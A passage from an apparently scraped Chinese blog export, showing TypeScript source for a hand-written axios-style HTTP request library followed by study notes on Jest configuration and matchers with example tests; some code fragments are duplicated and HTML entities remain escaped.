params &#125; = config; return buildURL(url, params)&#125;export default axios 工具类data.ts 12345678import &#123; isPlainObject &#125; from &quot;./util&quot;;export function transformRequest(data: any): any &#123; if (isPlainObject(data)) &#123; return JSON.stringify(data) &#125; return data&#125; headers.ts 1234567891011121314151617181920212223import &#123; isPlainObject &#125; from &quot;./util&quot;function normalizeHeaderName(headers: any, normalizedName: string): void &#123; if (!headers) &#123; return &#125; Object.keys(headers).forEach(name =&gt; &#123; if (name !== normalizedName &amp;&amp; name.toUpperCase() === normalizedName.toUpperCase()) &#123; headers[normalizedName] = headers[name] delete headers[name] &#125; &#125;)&#125;export function processHeaders(headers: any, data: any): any &#123; normalizeHeaderName(headers, &apos;Content-Type&apos;) if (isPlainObject(data)) &#123; if (headers &amp;&amp; !headers[&apos;Content-Type&apos;]) &#123; headers[&apos;Content-Type&apos;] = &apos;application/json;charset=utf-8&apos; &#125; &#125; return headers&#125; url.ts 123456789101112131415161718import &#123; isDate, isPlainObject &#125; from &apos;./util&apos;function encode(val: string): string &#123; return encodeURIComponent(val) .replace(/%40/g, &apos;@&apos;) .replace(/%3A/ig, &apos;:&apos;) .replace(/%24/g, &apos;**util.ts**​```tsxconst toString = Object.prototype.toStringexport function isDate(val: any): val is Date &#123; return toString.call(val) === &apos;[object Date]&apos;&#125;export function isPlainObject(val: any): val is Object &#123; return toString.call(val) === &apos;[object Object]&apos;&#125; 处理响应数据定义响应接口 types/index 1234567891011export interface AxiosResponse &#123; data: any status: number statusText: string headers: any config: AxiosRequestConfig request: any&#125;export interface AxiosPromise extends Promise&lt;AxiosResponse&gt; &#123;&#125; 处理 headers 的数据 helpers/header.ts 12345678910111213141516171819202122232425262728export function processHeaders(headers: any, data: any): any &#123; normalizeHeaderName(headers, &apos;Content-Type&apos;) if (isPlainObject(data)) &#123; if (headers &amp;&amp; !headers[&apos;Content-Type&apos;]) &#123; headers[&apos;Content-Type&apos;] = &apos;application/json;charset=utf-8&apos; &#125; &#125; return headers&#125;export function parseHeaders(headers: string): any &#123; let parsed = Object.create(null) if (!headers) &#123; return headers &#125; headers.split(&apos;\r\n&apos;).forEach(line =&gt; &#123; let [key, val] = line.split(&apos;:&apos;) key = key.trim().toLowerCase() if (!key) &#123; return &#125; if (val) &#123; val = val.trim(); &#125; parsed[key] = val &#125;) return parsed&#125; 处理 响应data helpers/data.ts 12345678910export function transformResponse(data: any): any &#123; if (typeof data === &apos;string&apos;) &#123; try &#123; data = JSON.parse(data) &#125; catch (e) &#123; // do nothing &#125; &#125; return data&#125; 修改 xhr, 返回一个 Promise xhr.ts 1234567891011121314151617181920212223242526272829303132333435363738394041import &#123; AxiosRequestConfig, AxiosPromise, AxiosResponse &#125; from &apos;./types&apos;import &#123; parseHeaders &#125; from &apos;./helpers/headers&apos;export default function xhr(config: AxiosRequestConfig): AxiosPromise &#123; return new Promise(resolve =&gt; &#123; const &#123; data = null, url, method = &apos;get&apos;, headers, responseType &#125; = config const request = new XMLHttpRequest() if (responseType) &#123; request.responseType = responseType &#125; // method,url,async request.open(method.toUpperCase(), url, true) request.onreadystatechange = function handleLoad() &#123; if (request.readyState !== 4) &#123; return &#125; const responseHeaders = parseHeaders(request.getAllResponseHeaders()) const responseData = responseType &amp;&amp; responseType !== &apos;text&apos; ? request.response : request.responseText const response: AxiosResponse = &#123; data: responseData, status: request.status, statusText: request.statusText, headers: responseHeaders, config, request &#125; resolve(response) &#125; Object.keys(headers).forEach(name =&gt; &#123; if (data === null &amp;&amp; name.toLowerCase() === &apos;content-type&apos;) &#123; delete headers[name] &#125; else &#123; request.setRequestHeader(name, headers[name]) &#125; &#125;) request.send(data) &#125;)&#125; 具体代码地址 ) .replace(/%2C/ig, &apos;,&apos;) .replace(/%20/g, &apos;+&apos;) .replace(/%5B/ig, &apos;[&apos;) .replace(/%5D/ig, &apos;]&apos;) } export function buildURL(url: string, params?: any): string { if (!params) { return url } const parts: string[] = [] Object.keys(params).forEach(key =&gt; { const val = params[key] if (val === null || typeof val === &apos;undefined&apos;) { return } let values = [] if (Array.isArray(val)) { values = val key += &apos;[]&apos; } else { values = [val] } values.forEach(val =&gt; { if (isDate(val)) { val = val.toISOString() } else if (isPlainObject(val)) { val = JSON.stringify(val) } parts.push( `${encode(key)}=${encode(val)}` ) }) }) let serializedParams = parts.join(‘&amp;’) if (serializedParams) { const markIndex = url.indexOf(&apos;#&apos;) if (markIndex !== -1) { url = url.slice(0, markIndex) } url += (url.indexOf(&apos;?&apos;) === -1 ? &apos;?&apos; : &apos;&amp;&apos;) + serializedParams } return url} 12345678910111213**util.ts**​```tsxconst toString = Object.prototype.toStringexport function isDate(val: any): val is Date &#123; return toString.call(val) === &apos;[object Date]&apos;&#125;export function isPlainObject(val: any): val is Object &#123; return toString.call(val) === &apos;[object Object]&apos;&#125; 处理响应数据定义响应接口 types/index 1234567891011export interface AxiosResponse &#123; data: any status: number statusText: string headers: any config: AxiosRequestConfig request: any&#125;export interface AxiosPromise extends Promise&lt;AxiosResponse&gt; &#123;&#125; 处理 headers 的数据 helpers/header.ts 12345678910111213141516171819202122232425262728export function processHeaders(headers: any, data: any): any &#123; normalizeHeaderName(headers, &apos;Content-Type&apos;) if (isPlainObject(data)) &#123; if (headers &amp;&amp; !headers[&apos;Content-Type&apos;]) &#123; headers[&apos;Content-Type&apos;] = &apos;application/json;charset=utf-8&apos; &#125; &#125; return headers&#125;export function parseHeaders(headers: string): any &#123; let parsed = Object.create(null) if (!headers) &#123; return headers &#125; headers.split(&apos;\r\n&apos;).forEach(line =&gt; &#123; let [key, val] = line.split(&apos;:&apos;) key = key.trim().toLowerCase() if (!key) &#123; return &#125; if (val) &#123; val = val.trim(); &#125; parsed[key] = val &#125;) return parsed&#125; 处理 响应data helpers/data.ts 12345678910export function transformResponse(data: any): any &#123; if (typeof data === &apos;string&apos;) &#123; try &#123; data = JSON.parse(data) &#125; catch (e) &#123; // do nothing &#125; &#125; return data&#125; 修改 xhr, 返回一个 Promise xhr.ts 1234567891011121314151617181920212223242526272829303132333435363738394041import &#123; AxiosRequestConfig, AxiosPromise, AxiosResponse &#125; from &apos;./types&apos;import &#123; parseHeaders &#125; from &apos;./helpers/headers&apos;export default function xhr(config: AxiosRequestConfig): AxiosPromise &#123; return new Promise(resolve =&gt; &#123; const &#123; data = null, url, method = &apos;get&apos;, headers, responseType &#125; = config const request = new XMLHttpRequest() if (responseType) &#123; request.responseType = responseType &#125; // method,url,async request.open(method.toUpperCase(), url, true) request.onreadystatechange = function handleLoad() &#123; if (request.readyState !== 4) &#123; return &#125; const responseHeaders = parseHeaders(request.getAllResponseHeaders()) const responseData = responseType &amp;&amp; responseType !== &apos;text&apos; ? request.response : request.responseText const response: AxiosResponse = &#123; data: responseData, status: request.status, statusText: request.statusText, headers: responseHeaders, config, request &#125; resolve(response) &#125; Object.keys(headers).forEach(name =&gt; &#123; if (data === null &amp;&amp; name.toLowerCase() === &apos;content-type&apos;) &#123; delete headers[name] &#125; else &#123; request.setRequestHeader(name, headers[name]) &#125; &#125;) request.send(data) &#125;)&#125; 具体代码地址]]></content>
      <categories>
        <category>TypeScript</category>
      </categories>
      <tags>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端必备的测试]]></title>
    <url>%2F2019-08-19-%E5%89%8D%E7%AB%AF%E5%BF%85%E5%A4%87%E7%9A%84%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0.html</url>
    <content type="text"><![CDATA[前端必备的测试DellLee 老师的 前端要学的测试课 从Jest入门到TDD/BDD双实战学习记录。 知识点 Jest 基础 基础API、异步测试、Mock技巧、快照、timer测试、Dom测试 实现项目 Vue、Vue-test-utils、React、Enzyme、TDD+单元测试、BDD+集成测试 初识测试1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859// math.jsfunction add(a, b) &#123; return a + b;&#125;function minus(a, b) &#123; return a - b&#125;export &#123; add, minus&#125;// math.test.js// 简陋测试import &#123; add, minus &#125; from './math'let resultlet expectedresult = add(3, 7)expected = 10;if (result !== 10) &#123; throw Error(`3 + 7 应该等于 $&#123;expected&#125;,但结果却是 $&#123;result&#125;`)&#125;result = minus(3, 3)expected = 0;if (result !== 0) &#123; throw Error(`3 - 3 应该等于 $&#123;expected&#125;,但结果却是 $&#123;result&#125;`)&#125;// 封装版import &#123; add, minus &#125; from './math'function expect(result) &#123; return &#123; toBe: function (actual) &#123; if (result !== actual) &#123; throw new Error(`预期值与实际值不相等 预期$&#123;actual&#125; 结果却是 $&#123;result&#125;`) &#125; &#125; &#125;&#125;function test(desc, fn) &#123; try &#123; fn(); console.log(`$&#123;desc&#125;通过测试`) &#125; catch (e) &#123; console.log(`$&#123;desc&#125;没有通过测试 $&#123;e&#125;`) &#125;&#125;test('测试加法3 + 7', () =&gt; &#123; expect(add(3, 7)).toBe(6)&#125;)test('测试减法6 - 3', () =&gt; &#123; expect(minus(6, 3)).toBe(6)&#125;) 自动化框架：Jest优点：性能、功能、易用性、速度快、Api简单、易配置、隔离性好、监控模式、IDE整合、Snapshot、多项目并行、覆盖率、Mock丰富 简单配置123456# 项目内部调用 jestnpx jest --init # 选择 browser-like# 随后选择自动生成报告，自动清除实例在每个test之前，就会生成一下配置文件jest.config.js jest.config.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205// For a detailed explanation regarding each configuration property, visit:// https://jestjs.io/docs/en/configuration.htmlmodule.exports = &#123; // All imported modules in your tests should be mocked automatically // 自动模拟在测试用例中的所有导入模块，在 __mocks__ 文件夹中寻找 // automock: false, // Stop running tests after `n` failures // 默认情况下，Jest运行所有测试并在完成后将所有错误生成到控制台，bil 让 jest 在 n 失败后停止运行测试 // bail: 0, // Respect "browser" field in package.json when resolving modules // false =&gt; browser | true =&gt; node // browser: false, // The directory where Jest should store its cached dependency information // 存放 jest 依赖信息缓存的目录 // cacheDirectory: "C:\\Users\\Administrator\\AppData\\Local\\Temp\\jest", // Automatically clear mock calls and instances between every test // 自动清除模拟调用和实例在每次测试之间 clearMocks: true, // Indicates whether the coverage information should be collected while executing the test // 是否收集测试时的覆盖率信息，因为要带上覆盖率搜集语句访问所有执行过的文件，这可能会让测试执行速度明显减慢 // collectCoverage: false, // An array of glob patterns indicating a set of files for which coverage information should be collected // 指示应收集覆盖率信息的全局模式一组文件，即使文件不存在测试，也将为其收集覆盖率信息，并且测试套件中不需要它 // collectCoverageFrom: null, // The directory where Jest should output its coverage files // jest 输出测速覆盖率文件的目录 // 运行 npx jest --coverage coverageDirectory: "coverage", // An array of regexp pattern strings used to skip coverage collection // 忽略测试的文件路径的正则匹配 // coveragePathIgnorePatterns: [ // "\\\\node_modules\\\\" // ], // A list of reporter names that Jest uses when writing coverage reports // coverageReporters: [ // "json", // "text", // "lcov", // "clover" // ], // An object that configures minimum threshold enforcement for coverage results // coverageThreshold: null, // A path to a custom dependency extractor // dependencyExtractor: null, // Make calling deprecated APIs throw helpful error messages // errorOnDeprecated: false, // Force coverage collection from ignored files using an array of glob patterns // forceCoverageMatch: [], // A path to a module which exports an async function that is triggered once before all test suites // globalSetup: null, // A path to a module which exports an async function that is triggered once after all test suites // globalTeardown: null, // A set of global variables that need to be available in all test environments // globals: &#123;&#125;, // The maximum amount of workers used to run your tests. Can be specified as % or a number. E.g. maxWorkers: 10% will use 10% of your CPU amount + 1 as the maximum worker number. maxWorkers: 2 will use a maximum of 2 workers. // maxWorkers: "50%", // An array of directory names to be searched recursively up from the requiring module's location // moduleDirectories: [ // "node_modules" // ], // An array of file extensions your modules use // 模块使用文件扩展名数组，当你导入的文件没有扩展名的时候，它会在这个数组里面去自动匹配 // moduleFileExtensions: [ // "js", // "json", // "jsx", // "ts", // "tsx", // "node" // ], // A map from regular expressions to module names that allow to stub out resources with a single module // 模块名映射，类 webpack alias 以及 jsconfig.js 的 compilerOptions.paths // moduleNameMapper: &#123;&#125;, // An array of regexp pattern strings, matched against all module paths before considered 'visible' to the module loader // modulePathIgnorePatterns: [], // Activates notifications for test results // notify: false, // An enum that specifies notification mode. Requires &#123; notify: true &#125; // notifyMode: "failure-change", // A preset that is used as a base for Jest's configuration // preset: null, // Run tests from one or more projects // projects: null, // Use this configuration option to add custom reporters to Jest // reporters: undefined, // Automatically reset mock state between every test // resetMocks: false, // Reset the module registry before running each individual test // resetModules: false, // A path to a custom resolver // resolver: null, // Automatically restore mock state between every test // restoreMocks: false, // The root directory that Jest should scan for tests and modules within // rootDir: null, // A list of paths to directories that Jest should use to search for files in // roots: [ // "&lt;rootDir&gt;" // ], // Allows you to use a custom runner instead of Jest's default test runner // runner: "jest-runner", // The paths to modules that run some code to configure or set up the testing environment before each test // setupFiles: [], // A list of paths to modules that run some code to configure or set up the testing framework before each test // 运行做测试的时候使用某些垫片为运行环境做兼容 // setupFilesAfterEnv: [], // A list of paths to snapshot serializer modules Jest should use for snapshot testing // 快照格式化 // snapshotSerializers: [], // The test environment that will be used for testing // testEnvironment: "jest-environment-jsdom", // Options that will be passed to the testEnvironment // testEnvironmentOptions: &#123;&#125;, // Adds a location field to test results // testLocationInResults: false, // The glob patterns Jest uses to detect test files // 匹配测试文件 // testMatch: [ // "**/__tests__/**/*.[jt]s?(x)", // "**/?(*.)+(spec|test).[tj]s?(x)" // ], // An array of regexp pattern strings that are matched against all test paths, matched tests are skipped // testPathIgnorePatterns: [ // "\\\\node_modules\\\\" // ], // The regexp pattern or array of patterns that Jest uses to detect test files // testRegex: [], // This option allows the use of a custom results processor // testResultsProcessor: null, // This option allows use of a custom test runner // testRunner: "jasmine2", // This option sets the URL for the jsdom environment. It is reflected in properties such as location.href // 模拟浏览器的地址 // testURL: "http://localhost", // Setting this value to "fake" allows the use of fake timers for functions such as "setTimeout" // timers: "real", // A map from regular expressions to paths to transformers // 不同文件类型对应不同的转换器 // transform: null, // An array of regexp pattern strings that are matched against all source file paths, matched files will skip transformation // transformIgnorePatterns: [ // "\\\\node_modules\\\\" // ], // An array of regexp pattern strings that are matched against all modules before the module loader will automatically return a mock for them // unmockedModulePathPatterns: undefined, // Indicates whether each individual test should be reported during the run // verbose: null, // An array of regexp patterns that are matched against all source file paths before re-running tests in watch mode // watchPathIgnorePatterns: [], // Whether to use watchman for file crawling // watchman: true,&#125;; babelrcjest 未配置转换时，默认只支持 commonjs 语法。 123456789101112&#123; "presets": [ [ "@babel/preset-env", &#123; "targets": &#123; "node": "current" &#125; &#125; ] ]&#125; jest转换（commonjs -&gt; es module）大概工作原理： npm run jest jest（babel-jest）jest 内部的 检测是有 babel-core 拿到 .babelrc 配置 再运行测试之前，结合 babel 把代码做一次转化 运行转化过的测试用例 常用匹配器（Matchers）数字.toBe().toEqual(value).toBeGreaterThan(number).toBeGreaterThanOrEqual(number).toBeLessThan(number).toBeLessThanOrEqual(number).toBeCloseTo(number,numDigits?)第二个参数为精度，代表几位小数点，默认为2位 .toBeNaN()1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// 数字相关test('匹配器：toBe-数字相等', () =&gt; &#123; // toBe 匹配器 matchers Object.is() === const a = 10 expect(a).toBe(10)&#125;)test('匹配器：toEqual-内容相等', () =&gt; &#123; // toEqual 匹配器 matchers const a = &#123; one: 1 &#125; expect(a).toEqual(&#123; one: 1 &#125;)&#125;)test('匹配器：toBeGreaterThan-大于比较数', () =&gt; &#123; // toBeGreaterThan 匹配器 matchers const a = 4 expect(a).toBeGreaterThan(3)&#125;)test('匹配器：toBeGreaterThanOrEqual-大于等于比较数', () =&gt; &#123; // toBeGreaterThanOrEqual 匹配器 matchers const a = 4 expect(a).toBeGreaterThanOrEqual(4)&#125;)test('匹配器：toBeLessThan-小于比较数', () =&gt; &#123; // toBeLessThan 匹配器 matchers const a = 4 expect(a).toBeLessThan(5)&#125;)test('匹配器：toBeLessThanOrEqual-小于等于比较数', () =&gt; &#123; // toBeLessThanOrEqual 匹配器 matchers const a = 4 expect(a).toBeLessThanOrEqual(4)&#125;)// 浮点数test('匹配器：toBeCloseTo-两个浮点数字相加', () =&gt; &#123; // toBeCloseTo 匹配器 matchers const value = 0.1 + 0.2; // expect(value).toBe(0.3); 这句会报错，因为浮点数有舍入误差 expect(value).toBeCloseTo(0.3); // 这句可以运行&#125;);// NaNtest('匹配器：toBeNaN-等于NaN', () =&gt; &#123; expect(NaN).toBeNaN(); expect(1).not.toBeNaN();&#125;); 真假 toBeNull只匹配 null toBeUndefined只匹配 undefined toBeDefined 与 toBeUndefined相反 toBeTruthy 匹配任何 if 语句为真 toBeFalsy匹配任何 if 语句为假 .toBeNull().toBeUndefined().toBeDefined().toBeTruthy().toBeFalsy()在JavaScript中，有六个falsy值：false，0，&#39;&#39;，null，undefined，和NaN。其他一切都是真实的。 123456789101112131415161718192021222324252627282930// 真假相关test('匹配器：toBeNull-与null相等', () =&gt; &#123; // toBeNull 匹配器 matchers const a = null expect(a).toBeNull()&#125;)test('匹配器：toBeUndefined-与undefined相等', () =&gt; &#123; // toBeUndefined 匹配器 matchers const a = undefined expect(a).toBeUndefined()&#125;)test('匹配器：toBeDefined-被定义过的,非 undefined 的，可为 null', () =&gt; &#123; // toBeDefined 匹配器 matchers const a = null expect(a).toBeDefined()&#125;)test('匹配器：toBeTruthy-真值或者隐藏为true的', () =&gt; &#123; // toBeTruthy 匹配器 matchers const a = 1 expect(a).toBeTruthy()&#125;)test('匹配器：toBeFalsy-真值或者隐藏为false的', () =&gt; &#123; // toBeFalsy 匹配器 matchers const a = null expect(a).toBeFalsy()&#125;) 否定.not12345test('匹配器：not-不是xx', () =&gt; &#123; // not 匹配器 matchers const a = 1 expect(a).not.toBeFalsy()&#125;) expect.not.arrayContaining(array)匹配不是接收值的子集 12345678describe('not.arrayContaining', () =&gt; &#123; const expected = [1]; it('如果接收的数组不包含1就通过测试', () =&gt; &#123; expect([2, 3, 4]).toEqual( expect.not.arrayContaining(expected) ) &#125;)&#125;) expect.not.objectContaining(object)匹配不包含某个对象 12345678describe('not.objectContaining', () =&gt; &#123; const expected = &#123; haha: 'laibh.top' &#125;; it('如果接收的对象不包含&#123; haha: laibh.top &#125;就通过测试', () =&gt; &#123; expect(&#123; haha: 'laibh.top1' &#125;).toEqual( expect.not.objectContaining(expected) ) &#125;)&#125;) expect.not.stringContaining(string)匹配不包含某个字符串 1234567describe('not.stringContaining', () =&gt; &#123; const expected = '赖同学'; it('如果接收的字符串不完全等于赖同学就通过测试', () =&gt; &#123; expect('赖').toEqual(expect.not.stringContaining(expected)); &#125;);&#125;); expect.not.stringMatching(string|regexp)同上，不过参数可以是正则表达式 1234567describe('not.stringMatching', () =&gt; &#123; const expected = /赖同学/; it('如果接收的字符串赖同学就通过测试', () =&gt; &#123; expect('赖').toEqual(expect.not.stringMatching(expected)); &#125;);&#125;); 字符串.toMatch(regexpOrString)12345678// 字符串test('匹配器：toMatch-正则字符串匹配', () =&gt; &#123; // toMatch 匹配器 matchers const str = 'http://laibh.top' expect(str).toMatch('laibh') // 使用正则 expect(str).toMatch(/laibh/)&#125;) expect.stringContaining(string)匹配包含某个字符串 expect.stringMatching(string|regexp)匹配字符串，可用正则 12345678910111213141516describe('stringMatching in arrayContaining', () =&gt; &#123; const expected = [ expect.stringMatching(/^Alic/), expect.stringMatching(/^[BR]ob/), ]; it('matches even if received contains additional elements', () =&gt; &#123; expect(['Alicia', 'Roberto', 'Evelina']).toEqual( expect.arrayContaining(expected), ); &#125;); it('does not match if received does not contain expected elements', () =&gt; &#123; expect(['Roberto', 'Evelina']).not.toEqual( expect.arrayContaining(expected), ); &#125;);&#125;) 数组expect.toContain()123456789// 数组test('匹配器：toContain-数组包含某项', () =&gt; &#123; // toContain 匹配器 matchers const arr = ['lai', 'bin', 'hong'] const set = new Set(arr) expect(set).toContain('lai') expect(arr).toContain('lai')&#125;) expect.arrayContaining(array)匹配子集 123456789describe('arrayContaining', () =&gt; &#123; const expected = ['1', '2']; it('即使接收值包含其他参数也匹配', () =&gt; &#123; expect(['1', '2', '3']).toEqual(expect.arrayContaining(expected)); &#125;); it('只要接收值不包含期望的值就不匹配', () =&gt; &#123; expect(['2', '4']).not.toEqual(expect.arrayContaining(expected)); &#125;);&#125;); 对象objectContaining(object)匹配任何递归预期属性的接收对象 12345678910test('测试onPress函数回调参数匹配对象', () =&gt; &#123; const onPress = jest.fn(); simulatePresses(onPress) expect(onPress).toBeCalledWith( expect.objectContaining(&#123; x: expect.any(Number), y: expect.any(Number) &#125;) )&#125;) .toHaveProperty(keyPath,value?)检查对象中各种属性存在和值，第二个参数是可选的 12345678910111213141516171819202122232425262728293031323334353637383940414243// Object containing house features to be testedconst houseForSale = &#123; bath: true, bedrooms: 4, kitchen: &#123; amenities: ['oven', 'stove', 'washer'], area: 20, wallColor: 'white', 'nice.oven': true, &#125;, 'ceiling.height': 2,&#125;;test('this house has my desired features', () =&gt; &#123; // Simple Referencing expect(houseForSale).toHaveProperty('bath'); expect(houseForSale).toHaveProperty('bedrooms', 4); expect(houseForSale).not.toHaveProperty('pool'); // 嵌套深层用 . expect(houseForSale).toHaveProperty('kitchen.area', 20); expect(houseForSale).toHaveProperty('kitchen.amenities', [ 'oven', 'stove', 'washer', ]); expect(houseForSale).not.toHaveProperty('kitchen.open'); // 嵌套深层用 [] expect(houseForSale).toHaveProperty(['kitchen', 'area'], 20); expect(houseForSale).toHaveProperty( ['kitchen', 'amenities'], ['oven', 'stove', 'washer'], ); expect(houseForSale).toHaveProperty(['kitchen', 'amenities', 0], 'oven'); expect(houseForSale).toHaveProperty(['kitchen', 'nice.oven']); expect(houseForSale).not.toHaveProperty(['kitchen', 'open']); // Referencing keys with dot in the key itself expect(houseForSale).toHaveProperty(['ceiling.height'], 'tall');&#125;); .toMatchObject(object)检查对象的属性的子集相匹配 1234567891011121314151617181920const houseForSale = &#123; bath: true, bedrooms: 4, kitchen: &#123; amenities: ['oven', 'stove', 'washer'], area: 20, wallColor: 'white', &#125;,&#125;;const desiredHouse = &#123; bath: true, kitchen: &#123; amenities: ['oven', 'stove', 'washer'], wallColor: expect.stringMatching(/white|yellow/), &#125;,&#125;;test('the house has my desired features', () =&gt; &#123; expect(houseForSale).toMatchObject(desiredHouse);&#125;); 类.toBeInstanceOf(Class)检查对象是一个类的实例 12345class A &#123;&#125;expect(new A()).toBeInstanceOf(A);expect(() =&gt; &#123;&#125;).toBeInstanceOf(Function);expect(new A()).toBeInstanceOf(Function); // throws 异常.toThrow(error?)1234567891011const throwNewErrorFunc = () =&gt; &#123; throw new Error('this is a new error') &#125;// 异常test('匹配器：toThrow-测试抛出异常', () =&gt; &#123; // toThrow 匹配器 matchers expect(throwNewErrorFunc).toThrow() // 测试抛出的内容 expect(throwNewErrorFunc).toThrow('this is a new error') // 表达式也行 expect(throwNewErrorFunc).toThrow(/this is a new error/)&#125;) 任意expect.anything()匹配除了 null、undefined的任意值，可以它使用在 toEqual或者 toBeCalledWith里面替代文字值 12345test('map 遍历一个非空的参数',()=&gt;&#123; const mock = jest.fn(); [1].map(x =&gt; mock(x)) expect(mock).toBeCalledWith(expect.anything())&#125;) expect.any(constructor)匹配任意构造器生成的实例 12345678function randocall(fn)&#123; return fn(Math.floor(Math.random()*6 + 1))&#125;test('测试 randocall的回调函数调用了一个数字',()=&gt;&#123; const mock = jest.fn(); randocall(mock) expect(mock).toBeCalledWith(expect.any(Number))&#125;) .toHaveLength(number)检查对象有个 length 属性并将设为某一数值。这对于检查数组或字符串大小特别有用。 123expect([1, 2, 3]).toHaveLength(3);expect('abc').toHaveLength(3);expect('').not.toHaveLength(5); .toContain(item)检查项目在数组或者字符串是否是另一个字符串的子串 123test('the flavor list contains lime', () =&gt; &#123; expect(getAllFlavors()).toContain('lime');&#125;); .toContainEqual(item)检查具有特定结构和值的元素是否包含在数据中 1234it('test contain', () =&gt; &#123; const testValue = &#123; bol: true &#125; expect([&#123; bol: true &#125;, &#123; sour: false &#125;]).toContainEqual(testValue)&#125;) 异步相关expect.assertions()匹配在测试用例里面使用断言的次数。确保在异步函数为了确保在回调函数里面断言被调用特别有用。 1234567891011test('异步调用所有回调',()=&gt;&#123; // 确保有两个断言被调用 expect.assertions(2) function callback1(data)&#123; expect(data).toBeTruthy() &#125; function callback2(data)&#123; expect(data).toBeTruthy(); &#125; doAsync(callback1,callback2)&#125;) expect.hasAssertions()匹配在测试用例里面至少使用一次断言 .resolves使用 resolves解开 fulfilled promise，如果 reject promise，则断言失败 1234test('resolves to lemon', () =&gt; &#123; // make sure to add a return statement return expect(Promise.resolve('lemon')).resolves.toBe('lemon');&#125;); 测试是异步的，需要告诉 jest 等待返回解开的断言 也可以用 async/await结合 .resolves 1234test('resolves to lemon', async () =&gt; &#123; await expect(Promise.resolve('lemon')).resolves.toBe('lemon'); await expect(Promise.resolve('lemon')).resolves.not.toBe('octopus');&#125;); .rejects使用 rejects解开 rejected promise,如果 fulfilled promise,则断言失败 1234test('rejects to octopus', async () =&gt; &#123; // make sure to add a return statement return expect(Promise.reject(new Error('octopus'))).rejects.toThrow('octopus');&#125;); 测试是异步的，需要告诉 jest 等待返回解开的断言 同样使用 async/await结合 .rejects 1234test('rejects to octopus', async () =&gt; &#123; await expect(Promise.reject(new Error('octopus'))).rejects.toThrow('octopus'); await expect(Promise.reject(new Error('octopus'))).rejects.not.toThrow('lemon');&#125;); 函数调用.toHaveBeenCalled()|.toBeCalled()确保模拟功能得到调用 12345678910111213141516171819202122232425262728293031323334353637function drinkAll(cb, flavour) &#123; if (flavour !== 'octopus') &#123; cb(flavour) &#125;&#125;describe('test drinkAll function', () =&gt; &#123; test('drink somthing lemon-flavour', () =&gt; &#123; const drink = jest.fn(); drinkAll(drink, 'lemon') expect(drink).toBeCalled(); &#125;)&#125;)describe('test drinkAll function', () =&gt; &#123; test('does not drink somthing octopus-flavour', () =&gt; &#123; const drink = jest.fn(); drinkAll(drink, 'octopus') expect(drink).not.toBeCalled(); &#125;)&#125;)describe('test drinkAll function', () =&gt; &#123; test('drink somthing lemon-flavour', () =&gt; &#123; const drink = jest.fn(); drinkAll(drink, 'lemon') expect(drink).toHaveBeenCalled(); &#125;)&#125;)describe('test drinkAll function', () =&gt; &#123; test('does not drink somthing octopus-flavour', () =&gt; &#123; const drink = jest.fn(); drinkAll(drink, 'octopus') expect(drink).not.toHaveBeenCalled(); &#125;)&#125;) .toHaveBeenCallTimes(number)|.toBeCalledTimes(number)确保模拟功能得到调用次数与指定数字一致 123456test('drinkEach drinks each drink', () =&gt; &#123; const drink = jest.fn(); drinkEach(drink, ['lemon', 'octopus']); expect(drink).toHaveBeenCalledTimes(2); expect(drink).toBeCalledTimes(2);&#125;); .toHaveBeenCalledWith(arg1,arg2,…)|.toBeCalledWith(arg1,arg2,…)确保模拟功能被调用的具体参数 12345678910function calledWithArg(cb) &#123; cb('Arg')&#125;test('test calledWithArg', () =&gt; &#123; const fn = jest.fn(); calledWithArg(fn); expect(fn).toBeCalledWith('Arg'); expect(fn).toHaveBeenCalledWith('Arg');&#125;); .toHaveBeenLastCalledWith(arg1,arg2,…)|.lastCalledWith(arg1, arg2, …)确保模拟功能被最后一次调用的具体参数 .toHaveBeenNthCalledWith(nthCall, arg1, arg2, ….)|.nthCalledWith(nthCall, arg1, arg2, ….)确保模拟功能多次调用的顺序 12345678test('drinkEach drinks each drink', () =&gt; &#123; const drink = jest.fn(); drinkEach(drink, ['lemon', 'octopus']); expect(drink).toHaveBeenNthCalledWith(1, 'lemon'); expect(drink).toHaveBeenNthCalledWith(2, 'octopus'); expect(drink).nthCalledWith(1, 'lemon'); expect(drink).nthCalledWith(2, 'octopus'); &#125;); n 必须是从 1开始的正整数 .toHaveReturned()|.toReturn()测试模拟函数成功返回(即没有抛出错误)至少一次 123456test('test calledWithArg', () =&gt; &#123; const fn = jest.fn(); calledWithArg(fn); expect(fn).toHaveReturned(); expect(fn).toReturn();&#125;); .toHaveReturnedTimes(number)|.toReturnTimes(number)确保模拟函数返回成功的次数,抛出错误的模拟函数的任何调用都不计入函数返回的次数 12345678test('drink returns twice', () =&gt; &#123; const drink = jest.fn(() =&gt; true); drink(); drink(); expect(drink).toHaveReturnedTimes(2);&#125;); .toHaveReturnedWith(value)|.toReturnWith(value)确保模拟函数返回特定的值 123456test('test Return 123', () =&gt; &#123; const fn = jest.fn(() =&gt; 123); calledWithArg(fn); expect(fn).toHaveReturnedWith(123) expect(fn).toReturnWith(123)&#125;); .toHaveLastReturnedWith(value)|.lastReturnedWith(value)确保模拟函数最后一次返回特定的值 .toHaveNthReturnedWith(nthCall, value)|.nthReturnedWith(nthCall, value)确保模拟函数第n次调用返回特定的值 第n个参数必须是从1开始的正整数。 自定义扩展expect.extend()pass表示是否有匹配，message提供一个没有参数的函数，在出现错误的情况下返回消息。当pass:false，message返回 expect(x).matcher()失败的错误信息，pass:true，message返回当expect(x).not.matcher()失败时的错误消息 1234567891011121314151617181920212223242526// expect.extend(matchers)expect.extend(&#123; toBeWithinRange(reveived, floor, ceiling) &#123; const pass = reveived &gt;= floor &amp;&amp; reveived &lt;= ceiling; if (pass) &#123; return &#123; message: () =&gt; `期待 $&#123;reveived&#125; 不在范围$&#123;floor&#125;-$&#123;ceiling&#125;内`, pass, &#125; &#125; else &#123; return &#123; message: () =&gt; `期待 $&#123;reveived&#125; 在范围$&#123;floor&#125;-$&#123;ceiling&#125;内`, pass, &#125; &#125; &#125;&#125;)test('测试范围', () =&gt; &#123; expect(100).toBeWithinRange(90, 100) 